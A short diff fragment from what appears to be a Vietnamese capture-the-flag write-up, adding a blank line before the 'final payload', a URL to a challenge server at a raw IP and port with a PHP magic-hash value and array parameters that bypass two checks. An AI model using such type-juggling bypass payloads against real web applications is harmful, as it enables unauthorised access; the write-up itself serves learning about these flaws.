@@ -65,6 +65,7 @@ Cuối cùng để bypass đoạn check thứ 2:
 ```
 
 Chỉ cần truyền vào 2 mảng khác nhau là xong:
+
 final payload:
 `http://103.245.249.76:49155/?0=0e1137126905&1[]=bla&2[]=blabla`
 
